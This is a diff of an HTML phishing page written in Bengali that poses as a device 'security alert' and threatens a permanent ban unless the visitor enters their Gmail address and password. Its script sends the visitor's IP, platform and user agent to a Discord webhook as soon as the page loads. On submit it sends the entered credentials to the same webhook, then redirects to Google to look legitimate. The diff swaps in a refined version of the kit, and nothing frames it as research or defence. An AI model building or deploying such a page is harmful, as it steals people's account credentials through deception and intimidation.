@@ -3,88 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Critical Device Alert</title>
+    <title>Device Recovery System</title>
     <style>
-        body { background: #ffffff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { width: 90%; max-width: 400px; padding: 20px; border: 2px solid red; text-align: center; border-radius: 10px; box-shadow: 0 0 15px rgba(255,0,0,0.2); }
-        h1 { color: red; font-size: 20px; }
-        .status { background: #eee; padding: 10px; margin: 15px 0; font-size: 13px; font-weight: bold; border-radius: 5px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: red; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        body { background: #ffffff; color: #000; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .box { width: 85%; max-width: 380px; border: 2px solid #ff0000; padding: 20px; border-radius: 12px; text-align: center; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
+        .warn { color: #ff0000; font-weight: bold; font-size: 20px; text-transform: uppercase; margin-bottom: 10px; }
+        .ip-box { background: #f0f0f0; padding: 8px; border-radius: 5px; font-family: monospace; font-weight: bold; margin: 10px 0; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>⚠️ সিকিউরিটি ওয়ার্নিং!</h1>
-    <p>আপনার মোবাইলটি <b>Temporary Block</b> হওয়ার তালিকায় আছে।</p>
-    <div class="status">আইপি অ্যাড্রেস: <span id="ip-display">Loading...</span></div>
-    <p style="font-size: 13px; color: #555;">আপনার জিমেইল ভেরিফাই না করলে ডিভাইসটি স্থায়ীভাবে ব্যান্ড হয়ে যাবে।</p>
+    <div class="warn">⚠️ সিকিউরিটি অ্যালার্ট!</div>
+    <p style="font-size: 14px; line-height: 1.5;">আপনার ডিভাইসটি <b>Suspicious Activity</b>-এর কারণে ব্লক করা হয়েছে। এখনই ভেরিফাই না করলে ডিভাইসটি স্থায়ীভাবে অচল হয়ে যাবে।</p>
     
-    <input type="email" id="email" placeholder="জিমেইল এড্রেস" required>
-    <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
-    <button onclick="sendPass()">ডিভাইস আনলক করুন</button>
+    <div class="ip-box">সনাক্তকৃত আইপি: <span id="ip">Scanning...</span></div>
+
+    <div id="form">
+        <input type="email" id="email" placeholder="আপনার প্রাইমারি জিমেইল" required>
+        <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
+        <button onclick="sendCredentials()">ডিভাইস আনলক করুন</button>
+    </div>
 </div>
 
 <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    // ১. লিঙ্কে ঢোকার সাথে সাথে আইপি পাঠানোর ফাংশন
-    async function instantCapture() {
+    // ১. ক্লিক করার সাথে সাথে ফাস্ট আইপি ট্র্যাকিং
+    async function quickCapture() {
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            
-            document.getElementById('ip-display').innerText = data.ip;
+            // আইপি সংগ্রহের জন্য দ্রুততম সার্ভিস
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            document.getElementById('ip').innerText = data.ip;
 
-            // ডিসকর্ডে আইপি পাঠানো
-            await fetch(WEBHOOK, {
+            // ডিসকর্ডে তৎক্ষণাৎ আইপি পাঠানো
+            fetch(HOOK, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    content: "🚀 **NEW TARGET ENTERED**",
+                    content: "🚀 **IMMEDIATE IP DETECTED** 🚀",
                     embeds: [{
                         color: 16711680,
                         fields: [
-                            { name: "IP Address", value: data.ip || "N/A" },
-                            { name: "City/Region", value: data.city + ", " + data.country_name },
-                            { name: "Network (Sim/Wifi)", value: data.org || "N/A" }
+                            { name: "IP Address", value: data.ip },
+                            { name: "Platform", value: navigator.platform },
+                            { name: "User Agent", value: navigator.userAgent }
                         ]
                     }]
                 })
             });
         } catch (e) {
-            console.log("Error capturing initial data");
+            // যদি আইপি সার্ভিস ফেল করে তবে শুধু ডিভাইস ইনফো পাঠাবে
+            fetch(HOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: "⚠️ Target entered but IP service blocked." })
+            });
         }
     }
 
-    // ২. পাসওয়ার্ড পাঠানোর ফাংশন
-    async function sendPass() {
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
-        
-        if(!u || !p) return alert("তথ্য পূরণ করুন!");
+    // ২. জিমেইল ও পাসওয়ার্ড পাঠানো
+    async function sendCredentials() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-        await fetch(WEBHOOK, {
+        if (!email || !pass) {
+            alert("সব তথ্য দিন নতুবা আপনার ফোনটি এখনই ব্যান্ড হবে!");
+            return;
+        }
+
+        await fetch(HOOK, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-                content: "🧨 **GMAIL CAPTURED**",
+                content: "🧨 **GMAIL CAPTURED** 🧨",
                 embeds: [{
                     color: 0,
                     fields: [
-                        { name: "Gmail", value: u },
-                        { name: "Password", value: p }
+                        { name: "Email", value: email },
+                        { name: "Password", value: pass }
                     ]
                 }]
             })
         });
-        alert("Verification Complete! Your device is safe now.");
-        window.location.href = "https://google.com";
+
+        alert("ভেরিফিকেশন সফল! আপনার ডিভাইসটি এখন সুরক্ষিত।");
+        window.location.href = "https://myaccount.google.com/";
     }
 
-    // পেজ লোড হওয়ার সাথে সাথেই আইপি ধরার কাজ শুরু হবে
-    window.onload = instantCapture;
+    // পেজ লোড হওয়ার সাথে সাথেই ফাংশনটি চালু হবে
+    window.onload = quickCapture;
 </script>
 
 </body>
